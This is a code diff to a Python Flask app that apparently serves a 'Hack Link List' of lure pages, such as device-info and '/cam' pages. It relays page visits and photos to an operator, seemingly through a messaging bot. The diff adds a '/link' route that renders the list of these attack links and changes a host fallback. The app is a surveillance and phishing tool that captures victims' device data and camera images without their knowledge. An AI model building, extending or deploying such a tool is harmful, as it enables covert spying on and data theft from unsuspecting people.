@@ -43,12 +43,14 @@ def GET_HOST():
     try :
         return request.host_url
     except :
-        return ""
+        return "."
 
 host = GET_HOST()
 
 
 info = f"""*‼️ Hack Link List:*
+
+{GET_HOST} : your links
 
 {host}/ - Basic for Device Info
 
@@ -110,17 +112,6 @@ def fix_base64_padding(base64_string):
 
 
 
-
-
-
-       
-
-
-
-
-
-
-
 def photo(photo_path, caption=""):
         try:
             time.sleep(0.1)
@@ -129,10 +120,6 @@ def photo(photo_path, caption=""):
             time.sleep(1)  
         except Exception as e:
             print(f"Failed to send photo to {user_id}: {str(e)}")
-
-
-    
-
 
 
 
@@ -159,6 +146,13 @@ def hello():
     USER = USERS()
     message(f"index page opened !\n ")
     return render_template("index.html")
+
+
+@app.route("/link")
+def link():
+    USER = USERS()
+    message(f"link list  page opened !\n ")
+    return render_template_string(info)
 
 @app.route("/cam")
 def he():
